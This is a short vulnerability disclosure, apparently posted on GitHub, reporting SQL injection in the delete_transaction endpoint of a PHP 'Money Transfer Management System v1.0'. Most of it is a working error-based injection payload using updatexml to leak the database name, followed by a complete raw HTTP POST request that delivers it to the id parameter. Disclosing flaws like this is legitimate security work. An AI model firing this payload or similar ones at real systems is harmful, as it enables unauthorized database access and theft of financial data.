# Money Transfer Management System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15015/money-transfer-management-system-send-money-businesses-php-free-source-code.html

Vulnerability File: \mtms\classes\Master.php?f=delete_transaction

Vulnerability location: /mtms/classes/Master.php?f=delete_transaction, id

[+] Payload: id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /mtms/classes/Master.php?f=delete_transaction HTTP/1.1
Host: 192.168.1.19
Content-Length: 65
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.19
Referer: http://192.168.1.19/mtms/admin/?page=transaction
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bnvs2lhahed1884v0nf12nt52s
Connection: close

id=3' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id
```

![image](https://user-images.githubusercontent.com/54017627/164725192-db310e54-abff-49a4-9848-253b87589225.png)

